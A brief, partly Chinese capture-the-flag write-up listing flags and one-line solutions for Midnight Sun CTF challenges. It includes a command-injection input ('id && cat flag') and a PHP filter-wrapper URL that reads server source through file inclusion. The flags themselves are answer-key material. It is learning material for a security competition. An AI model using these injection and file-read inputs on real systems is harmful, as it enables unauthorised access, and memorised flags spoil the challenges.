# Writeup

## Sanity

签到题

> midnight{n0_c0ugh1ng_0n_1rc}

## Verifier

> 知识点：签名

> 题解

1. 对``please_give_me_the_flag``签名
2. 拿到签名，获取flag

> midnight{number_used_once_or_twice_or_more}

## admpanel

> 知识点：逆向、Linux &&拼接命令

> 题解

1. IDA pro逆向，拿到密码password
2. id && cat flag

> midnight{n3v3r_4sk_b0bb_to_d0_S0m3TH4Ng}

## 

存在PHP伪协议

http://hackingforso-01.play.midnightsunctf.se/?file=php://filter/convert.base64-encode/resource=ac86dff64d2296531a41bfa575cb1d33.php